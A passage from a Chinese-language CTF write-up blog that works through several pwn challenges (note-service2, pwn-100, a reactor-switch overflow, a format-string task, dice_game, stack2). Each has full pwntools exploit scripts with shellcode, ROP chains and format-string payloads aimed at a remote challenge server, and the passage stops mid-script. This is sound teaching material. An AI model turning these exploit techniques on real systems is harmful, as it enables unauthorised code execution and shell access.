<p>目标转为数组越界，同时注意到这道题目是堆栈可执行的。那么就可以考虑，将shellcode写入堆，利用数组越界将堆指针替换为got表项，更改相应函数的执行内容。结合下文出现的参数传递问题，选择free函数是比较合适的。</p>
<p>但是每一个chunk输入最多为7字节，只能将shellcode分散，利用jmp指令跳转。</p>
<p>关于shellcode的编写。选择系统调用execve(“/bin/sh”,0,0)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov rdi, xxx   <span class="comment">//xxx=&amp;(&quot;/bin/sh&quot;)  </span></span><br><span class="line">mov rsi,<span class="number">0</span>   </span><br><span class="line">mov rax, <span class="number">0x3b</span> <span class="comment">//rax=0x3b execve在64位下的系统调用号</span></span><br><span class="line">mov rdx,<span class="number">0</span>   </span><br><span class="line">syscall </span><br></pre></td></tr></table></figure>

<p>但是<code>mov rsi,0</code>太长，因此换为<code>xor rsi, rsi </code>利用异或实现。同理<code>mov rdx,0 </code>也是。</p>
<p>这里又出现个问题就是，‘/bin/sh’太长，不能直接传递。需要利用函数的参数传递，首先将‘/bin/sh’写入一个chunk，然后free。这时候根据64位的参数传递规则，‘/bin/sh’作为free的参数传递给了rdi。</p>
<p>接下来需要解决的是在不同chunk间的跳转。使用jmp short(\xeb)实现短转移。需要知道之间的相对偏移。</p>
<p>上文分析过每个chunk依次申请，大小一致都是0x20.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231022120.png" alt="image-20201123231022120"></p>
<p>chunk的状态如图所示，为了统一方便计算。将jmp指令放在最后，不足的用用nop填充（\x90）。那么即从当前chunk的jmp区跳到下一个chunk的data区，距离是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8+8+8（prevs_size+size+上个chunk的空）+1（一个未写入的空子节）&#x3D;0x19</span><br></pre></td></tr></table></figure>

<p><code>即跳转指令</code>\xeb\x19`。</p>
<p>最后就是得到free的got表项的地址相对于global的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084832598.png" alt="image-20201125084832598"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084904525.png" alt="image-20201125084904525"></p>
<p>偏移为<code>(0x0000000000202018-0x0000000002020A0)/8</code>得到-17.</p>
<p>所以得到exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note-service2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">42169</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"><span class="comment">#改写free的got</span></span><br><span class="line">add(<span class="number">-17</span>,asm(<span class="string">&quot;xor rsi,rsi&quot;</span>)+<span class="string">b&#x27;\x90\x90\xeb\x19&#x27;</span> )</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">&quot;mov eax,0x3b&quot;</span>)+<span class="string">b&quot;\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">&quot;xor rdx,rdx&quot;</span>)+<span class="string">b&quot;\x90\x90\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">&quot;syscall&quot;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231554223.png" alt="image-20201123231554223"></p>
<h3 id="10-pwn-100"><a href="#10-pwn-100" class="headerlink" title="10. pwn-100"></a>10. pwn-100</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211331082.png" alt="image-20210108211331082"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209164911452.png" alt="image-20201209164911452"></p>
<p><strong>考察知识点：栈溢出、DynELF</strong></p>
<h4 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165235082.png" alt="image-20201209165235082"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165320208.png" alt="image-20201209165320208"></p>
<p>整个程序很简单，只发现一个栈溢出漏洞，而且开启了堆栈不可执行。</p>
<h4 id="思路及利用-7"><a href="#思路及利用-7" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>思路显然就是利用栈溢出漏洞，编写gadget执行system。</p>
<p>首先需要泄露地址。这里可以借助pwntools的dynelf函数。</p>
<blockquote>
<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块.</p>
</blockquote>
<p>代码框架如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">&#x27;./xxx&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line">  payload = <span class="string">&quot;xxxxxxxx&quot;</span> + address + <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;./xxx&quot;</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line">systemAddress = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，DynELF需要能够泄露信息的漏洞反复触发，因此每一次泄露需要最终返回到start。</p>
<p>整个程序十分简单，能够用来输出的只有puts函数。给puts函数传参，需要用到<code>pop rdi，ret</code>这样的gadget。</p>
<p>使用ROPgadget查找。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209170839114.png" alt="image-20201209170839114"></p>
<p>得到需要的地址如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">poprdi = <span class="number">0x0000000000400763</span></span><br><span class="line">start = start_addr = <span class="number">0x400550</span></span><br></pre></td></tr></table></figure>



<p>最终得到如下的泄露函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>		<span class="comment">#填充0x40+8位垃圾数据</span></span><br><span class="line">    payload += p64(poprdi)	<span class="comment">#覆盖ret，执行pop rdi，ret</span></span><br><span class="line">    payload += p64(addr)	<span class="comment">#addr——&gt;rdi</span></span><br><span class="line">    payload += p64(puts_plt)<span class="comment">#ret语句执行的地址，调用puts函数，相当于puts(addr)</span></span><br><span class="line">    payload += p64(start)	<span class="comment">#puts函数调用后的ret，返回开始。</span></span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    up = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> <span class="comment">#puts函数的接受处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了；以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line">        c = p.recv(numb = <span class="number">1</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = data[:<span class="number">-1</span>]</span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += c</span><br><span class="line">            up = c</span><br><span class="line">    data = data[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./pwn-100&#x27;</span>))</span><br><span class="line">system = d.lookup(<span class="string">&#x27;__libc_system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>完成泄露system地址之后，就是执行system函数，传递“/bin/sh”参数得到shell了。</p>
<p>观察整个程序，并没有改写got的余地与必要。同时之前寻找<code>pop rdi，ret</code>时发现了足够的gadget。因此，考虑通过gadget传递参数执行system函数。</p>
<p>那么，第一步就是将‘/bin/sh’写入到内存的某个地方。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209172219756.png" alt="image-20201209172219756"></p>
<p>可以看到bss段是可写的，于是，利用read函数，将‘/bin/sh’写入bss段。</p>
<p>read函数一共有要三个传参寄存器rdi, rsi, rdx。</p>
<p>而在 libc_csu_init 中，有一段万能gadget。</p>
<p> <img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209173406970.png" alt="image-20201209173406970"></p>
<p>可以先传给r13，r14，r15再mov到相应寄存器。</p>
<p>于是又如下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh = <span class="number">0x601000</span></span><br><span class="line">gadget = <span class="number">0x40075a</span> <span class="comment"># pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span></span><br><span class="line">gadget1 = <span class="number">0x400740</span> <span class="comment"># mov %r13,%rdx;mov %r14,%rsi;mov %r15d,%edi; callq  *(%r12,%rbx,8)</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget) </span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1</span></span><br><span class="line">payload += p64(read_plt)<span class="comment"># r12 = read_got</span></span><br><span class="line">payload += p64(<span class="number">8</span>)<span class="comment"># r13 = 8,count;读入8个字节</span></span><br><span class="line">payload += p64(sh)<span class="comment"># r14 = sh,* buf = sh</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># r15 = 0,fd = 0;标准输入</span></span><br><span class="line">payload += p64(gadget1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">56</span><span class="comment">#gadget11需要56个栈空间。</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>至此完成了，‘/bin/sh’的输入，最后就是调用system函数。只需要将sh地址传给rdi调用system即可。</p>
<p>最终完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-100&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">54991</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn-100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">poprdi = <span class="number">0x0000000000400763</span></span><br><span class="line">start = start_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">    payload += p64(poprdi)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    up = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = p.recv(numb = <span class="number">1</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = data[:<span class="number">-1</span>]</span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += c</span><br><span class="line">            up = c</span><br><span class="line">    data = data[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=elf)</span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x601000</span></span><br><span class="line">gadget = <span class="number">0x40075a</span> <span class="comment"># pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span></span><br><span class="line">gadget1 = <span class="number">0x400740</span> <span class="comment"># mov %r13,%rdx;mov %r14,%rsi;mov %r15d,%edi; callq  *(%r12,%rbx,8)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget) </span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1</span></span><br><span class="line">payload += p64(read_got)<span class="comment"># r12 = read_got</span></span><br><span class="line">payload += p64(<span class="number">8</span>)<span class="comment"># r13 = 8,count;读入8个字节</span></span><br><span class="line">payload += p64(sh)<span class="comment"># r14 = sh,* buf = sh</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># r15 = 0,fd = 0;标准输入</span></span><br><span class="line">payload += p64(gadget1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(sh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209175028067.png" alt="image-20201209175028067"></p>
<h3 id="11-反应釜开关控制"><a href="#11-反应釜开关控制" class="headerlink" title="11. 反应釜开关控制"></a>11. 反应釜开关控制</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211458145.png" alt="image-20210108211458145"><img src="/posts/5600bec/image-20201123091430114.png" alt="image-20201123091430114"></p>
<p><strong>考察知识点：栈溢出</strong></p>
<h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="/posts/5600bec/image-20201123091242758.png" alt="image-20201123091242758"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231711816.png" alt="image-20201123231711816"></p>
<p><img src="/posts/5600bec/image-20201123091319181.png" alt="image-20201123091319181"></p>
<p><img src="/posts/5600bec/image-20201123091712759.png" alt="image-20201123091712759"></p>
<p>这道题感觉应该是不给附件中的可执行文件盲打才对，不然知道可执行文件用ida反编译，就知道是很就简单的栈溢出。通过三次栈溢出，覆盖返回地址跳转到后门函数。</p>
<h4 id="思路及利用-8"><a href="#思路及利用-8" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>首先保护只有堆栈不可执行。同时是使用gets函数获取输入。那么就可以随意的进行栈溢出。那么思路就很简单了。先通过栈溢出覆盖返回地址，从main跳到easy，从easy跳到normal，从normal跳到shell。</p>
<p>需要注意的是，ida显示的与rbp的距离有时候是不准确的，最好是通过gdb动态调试得到。这里为了方便，直接用来ida显示，成功得到shell。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./reactionkettle&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49151</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">easy = p.recv(<span class="number">8</span>)</span><br><span class="line">easy =  <span class="built_in">int</span>(easy,<span class="number">16</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(easy)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">normal = p.recv(<span class="number">8</span>)</span><br><span class="line">normal  =  <span class="built_in">int</span>(normal,<span class="number">16</span>) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x188</span>+p64(normal)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">shell = p.recv(<span class="number">8</span>)</span><br><span class="line">shell = <span class="built_in">int</span>(shell,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(shell)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="12-实时数据监测"><a href="#12-实时数据监测" class="headerlink" title="12. 实时数据监测"></a>12. 实时数据监测</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211606429.png" alt="image-20210108211606429"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083521011.png" alt="image-20201125083521011"></p>
<p><strong>考察知识点：格式化字符串</strong></p>
<h4 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083728103.png" alt="image-20201125083728103"></p>
<p>显然目标就是将key的值改为35795746，也就是0x02223322。这里有用到ida一个技巧，ida里字符串是以编码的值存储的，找到对应的值，选中，按下a就可以转为字符串显示。这里的”The location of key is %08x, and its value is %08x,not the 0x02223322. (╯°Д°)╯︵ ┻━┻\n”就是这样得来的。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084015380.png" alt="image-20201125084015380"></p>
<p>这显然是一个格式化字符串漏洞。</p>
<h4 id="思路及利用-9"><a href="#思路及利用-9" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>根据上述分析，只需要输入一个格式化字符串，将&amp;key改为0x02223322就可以。</p>
<p>那么首先，寻找格式化字符串的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084321047.png" alt="image-20201125084321047"></p>
<p>可以看到偏移为12.</p>
<p>使用ida查询key的地址</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084627078.png" alt="image-20201125084627078"></p>
<p>然后借助fmtstr_payload快速构造格式化字符串。<code>fmtstr_payload(12,&#123;0x804A048:0x02223322&#125;)</code></p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./实时数据监测&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52658</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>,&#123;<span class="number">0x804A048</span>:<span class="number">0x02223322</span>&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084651226.png" alt="image-20201125084651226"></p>
<h3 id="13-dice-game"><a href="#13-dice-game" class="headerlink" title="13. dice_game"></a>13. dice_game</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211729451.png" alt="image-20210108211729451"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123094345375.png" alt="image-20201123094345375"></p>
<p><strong>考察知识点：栈溢出修改随机数种子</strong></p>
<h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><p>通过ida反编译阅读源码</p>
<p><img src="/posts/5600bec/image-20201123094603206.png" alt="image-20201123094603206"></p>
<p><img src="/posts/5600bec/image-20201123094616274.png" alt="image-20201123094616274"></p>
<p>可以看出，这是一个骰子游戏。连续猜对50次就可以得到flag。</p>
<p>通过分析栈可以知道，输入的name是可以覆盖掉seed的。</p>
<h4 id="思路及利用-10"><a href="#思路及利用-10" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>计算机的随机数都是伪随机数，种子一样时，rand函数会提供一样的数。所以需要控制seed的值。使用name覆盖seed。</p>
<p><strong>需要注意的是，由于exp使用python编写，但这里需要用到c的函数。需要用上一点混合编程的技巧。</strong></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *  <span class="comment"># 提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">59063</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line"><span class="comment">#覆盖seed值为0</span></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;point(1~6): &quot;</span>)</span><br><span class="line">    <span class="comment">#混合编程，调用c的rand函数，rand的缺省时默认种子参数是0</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/posts/5600bec/image-20201123095347070.png" alt="image-20201123095347070"></p>
<h3 id="14-satck2"><a href="#14-satck2" class="headerlink" title="14. satck2"></a>14. satck2</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211918463.png" alt="image-20210108211918463"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108214014855.png" alt="image-20210108214014855"></p>
<p><strong>考察知识点：数组越界</strong></p>
<h4 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h4><p>整个程序实现了一个平均数计算，用户可以输入指定个数的数字计算平均值，其中数字打印、修改、添加。</p>
<p>漏洞出现在添加数字时，没有对数组索引做限制，造成数组越界。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108215647477.png"></p>
<p>同时也找到了后门函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108215423011.png" alt="image-20210108215423011"></p>
<h4 id="思路及利用-11"><a href="#思路及利用-11" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>思路很明显就是利用数组越界，将返回地址修改为后门函数地址。</p>
<p>那么关键就在于找到数组与返回地址的偏移。</p>
<p>这里需要注意是，ida所得到的偏移并不准确，ida显示偏移为74h，测试后发现不是。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108215956786.png" alt="image-20210108215956786"></p>
<p>所以只好动态调试：</p>
<p>在<code>v13[v5] = v7</code>下断点，运行</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108221714368.png" alt="image-20210108221714368"></p>
<p>确定数组距离ebp的距离是0x70即（0xffffcf28），从汇编可以看出，eax存放v5，edx存放v7.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108221830447.png" alt="image-20210108221830447"></p>
<p>这和ida中显示的一致，很明显是返回地址出现了偏差。继续运行到retn指令。</p>
<p>可以看到在最后修改了esp，也就是说返回地址为0xffffcfac。所以偏移为0x84.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108222306175.png" alt="image-20210108222306175"></p>
<p>编写exp：</p>
<p>注意小端序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./stack2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">45323</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,num</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;you have:\n&quot;</span>)</span><br><span class="line">p.sendline(<span 